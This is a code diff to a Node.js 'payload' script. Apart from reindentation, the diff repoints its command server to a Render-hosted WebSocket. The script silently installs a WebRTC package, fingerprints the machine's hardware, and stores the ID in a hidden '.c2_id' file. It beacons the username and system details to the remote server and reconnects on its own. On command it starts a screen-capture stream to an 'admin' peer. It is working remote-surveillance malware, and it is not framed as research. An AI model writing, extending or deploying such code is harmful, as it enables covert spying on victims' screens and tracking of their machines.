@@ -6,10 +6,10 @@ const fs = require('fs');
 const crypto = require('crypto');
 
 try {
-    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
-    if (!fs.existsSync(nodeModulesPath)) {
-        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
-    }
+  const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
+  if (!fs.existsSync(nodeModulesPath)) {
+    execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
+  }
 } catch (e) {}
 
 let wrtc;
@@ -22,14 +22,15 @@ const LOG_FILE = path.join(LOG_DIR, 'payload.log');
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 function log(msg) {
-    const timestamp = new Date().toISOString();
-    console.log(`[${timestamp}] ${msg}`);
-    fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+  const timestamp = new Date().toISOString();
+  console.log(`[${timestamp}] ${msg}`);
+  fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
 }
 
 log("[INIT] Payload starting...");
 
-const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
+// POINTS TO YOUR RENDER SERVER — NOT VERCEL
+const WS_URL = 'wss://server-nuc6.onrender.com';
 
 let myId = null;
 let ws = null;
@@ -38,44 +39,46 @@ let isConnected = false;
 
 // --- HARDWARE FINGERPRINT GENERATION ---
 function getHardwareFingerprint() {
-    const mac = getMacAddress();
-    const cpuSerial = getCpuSerial();
-    const boardSerial = getBoardSerial();
-    return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
+  const mac = getMacAddress();
+  const cpuSerial = getCpuSerial();
+  const boardSerial = getBoardSerial();
+  return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
 }
 
 function getMacAddress() {
-    const interfaces = os.networkInterfaces();
-    for (const name of Object.keys(interfaces)) {
-        for (const iface of interfaces[name]) {
-            if (iface.family === 'IPv4' && !iface.internal) {
-                return iface.mac;
-            }
-        }
+  const interfaces = os.networkInterfaces();
+  for (const name of Object.keys(interfaces)) {
+    for (const iface of interfaces[name]) {
+      if (iface.family === 'IPv4' && !iface.internal) {
+        return iface.mac;
+      }
     }
-    return '00:00:00:00:00:00';
+  }
+  return '00:00:00:00:00:00';
 }
 
 function getCpuSerial() {
-    try { return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); } catch (e) { return 'unknown_cpu'; }
+  try { return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); }
+  catch (e) { return 'unknown_cpu'; }
 }
 
 function getBoardSerial() {
-    try { return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); } catch (e) { return 'unknown_board'; }
+  try { return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); }
+  catch (e) { return 'unknown_board'; }
 }
 
 // Try to load persistent ID from disk first
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
-    if (fs.existsSync(PERSIST_FILE)) {
-        const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
-        if (savedId && savedId.length > 0) myId = savedId;
-    }
+  if (fs.existsSync(PERSIST_FILE)) {
+    const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
+    if (savedId && savedId.length > 0) myId = savedId;
+  }
 } catch(e) {}
 
 if (!myId) {
-    myId = getHardwareFingerprint();
-    try { fs.writeFileSync(PERSIST_FILE, myId); } catch(e) {}
+  myId = getHardwareFingerprint();
+  try { fs.writeFileSync(PERSIST_FILE, myId); } catch(e) {}
 }
 
 log(`[ID] Hardware Fingerprint: ${myId}`);
@@ -84,97 +87,96 @@ let peerConnection = null;
 let localStream = null;
 
 function initConnection() {
-    log(`[WS] Attempting connection...`);
-    ws = new WebSocket(WS_URL);
+  log(`[WS] Attempting connection to ${WS_URL}...`);
+  ws = new WebSocket(WS_URL);
 
-    ws.on('open', () => {
-        reconnectAttempts = 0;
-        isConnected = true;
-        safeSend(JSON.stringify({
-            type: 'info',
-            id: myId,
-            uniqueId: myId, // Send this explicitly
-            os: os.platform(),
-            arch: os.arch(),
-            user: os.userInfo().username,
-            ip: '127.0.0.1'
-        }));
-        startMonitoring();
-    });
+  ws.on('open', () => {
+    reconnectAttempts = 0;
+    isConnected = true;
+    safeSend(JSON.stringify({
+      type: 'info',
+      id: myId,           // <-- THIS IS THE HARDWARE FINGERPRINT
+      uniqueId: myId,     // <-- ALSO SEND IT AS uniqueId
+      os: os.platform(),
+      arch: os.arch(),
+      user: os.userInfo().username,
+      ip: '127.0.0.1'
+    }));
+    startMonitoring();
+  });
 
-    ws.on('message', (msg) => {
-        try {
-            const data = JSON.parse(msg);
-            if (data.type === 'request_join') handleJoinRequest();
-            else if (data.type === 'offer') handleOffer(data.sdp);
-            else if (data.type === 'answer') handleAnswer(data.sdp);
-            else if (data.type === 'candidate') handleCandidate(data.candidate);
-        } catch (e) {}
-    });
+  ws.on('message', (msg) => {
+    try {
+      const data = JSON.parse(msg);
+      if (data.type === 'request_join') handleJoinRequest();
+      else if (data.type === 'offer') handleOffer(data.sdp);
+      else if (data.type === 'answer') handleAnswer(data.sdp);
+      else if (data.type === 'candidate') handleCandidate(data.candidate);
+    } catch (e) {}
+  });
 
-    ws.on('close', () => {
-        isConnected = false;
-        setTimeout(initConnection, 5000);
-    });
+  ws.on('close', () => {
+    isConnected = false;
+    setTimeout(initConnection, 5000);
+  });
 }
 
 function safeSend(msg) {
-    if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
+  if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
 }
 
 function startMonitoring() {
-    setInterval(() => {
-        if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
-    }, 30000);
+  setInterval(() => {
+    if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
+  }, 30000);
 }
 
 async function captureScreenPureJS() {
-    if (!peerConnection) {
-        peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    }
-    
-    // Clear existing tracks
-    const transceivers = peerConnection.getTransceivers();
-    transceivers.forEach(t => {
-        if (t.sender.track) t.sender.stop();
-    });
+  if (!peerConnection) {
+    peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  }
 
-    try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
+  const transceivers = peerConnection.getTransceivers();
+  transceivers.forEach(t => {
+    if (t.sender.track) t.sender.stop();
+  });
 
-        peerConnection.onicecandidate = (event) => {
-            if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
-        };
+  try {
+    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+    stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
 
-        const offer = await peerConnection.createOffer();
-        await peerConnection.setLocalDescription(offer);
-        safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
-    } catch (err) {
-        log(`[WEBRTC] Screen capture error: ${err.message}`);
-    }
+    peerConnection.onicecandidate = (event) => {
+      if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
+    };
+
+    const offer = await peerConnection.createOffer();
+    await peerConnection.setLocalDescription(offer);
+    safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
+  } catch (err) {
+    log(`[WEBRTC] Screen capture error: ${err.message}`);
+  }
 }
 
 function handleJoinRequest() {
-    log("[JOIN] Request received. Starting screen share...");
-    captureScreenPureJS();
+  log("[JOIN] Request received. Starting screen share...");
+  captureScreenPureJS();
 }
 
 function handleOffer(offerSDP) {
-    if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
-        .then(() => peerConnection.createAnswer())
-        .then(answer => peerConnection.setLocalDescription(answer))
-        .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
-        .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
+  if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+  peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
+    .then(() => peerConnection.createAnswer())
+    .then(answer => peerConnection.setLocalDescription(answer))
+    .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
+    .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
 }
 
 function handleAnswer(answerSDP) {
-    if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
+  if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
 }
 
 function handleCandidate(candidate) {
-    if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
+  if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
 }
 
 initConnection();
